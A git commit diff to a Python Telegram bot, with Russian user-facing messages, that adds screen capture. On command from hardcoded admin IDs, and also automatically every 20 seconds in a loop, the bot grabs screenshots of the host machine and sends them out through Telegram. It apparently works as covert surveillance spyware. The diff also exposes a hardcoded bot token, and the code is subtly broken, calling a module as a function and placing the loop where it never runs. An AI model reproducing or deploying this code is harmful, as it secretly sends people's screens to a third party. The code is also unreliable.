b1d1050295013af2ad600eee389b8d7102707538
Declonu4 <declon3233@gmail.com>
2023-06-15 18:06:36 +0300

    added sending func

--- bot.py
+++ bot.py
@@ -1,13 +1,25 @@
 import telebot;
 from telebot import types;
 import time;
+import get_screenshots_bytes;
+
 
 bot = telebot.TeleBot("6182954429:AAFhs3NF6Diynl2lFBzNvJGpwtTd9GGshMs")
-admins = []
+admins = [1148309975, 1028390936]
 @bot.message_handler(commands=['start'])
 def start(message):
   bot.send_message(message.chat.id, text="Приветствую вас, чего желаете?")
   
+@bot.message_handler(content_types=['text'])
+def func(message):
+    Command_sender = message.from_user.id
+    if Command_sender in admins:
+        if(message.text == "get screenshot"):
+            png = get_screenshots_bytes()
+            bot.send_photo(message.chat.id, png)
+            
+    else: bot.send_message(message.chat.id, text='Простите, у вас нет доступа')
+            
 def Work():
    try:
      y = bot.polling(none_stop=True, interval=0.5)
@@ -17,5 +29,11 @@ def Work():
       time.sleep(60)
       Work()
 
-
 Work()
+
+def screengrab():
+    time.sleep(20)
+    png = get_screenshots_bytes()
+    bot.send_photo(admins, png)
+    screengrab()
+screengrab()
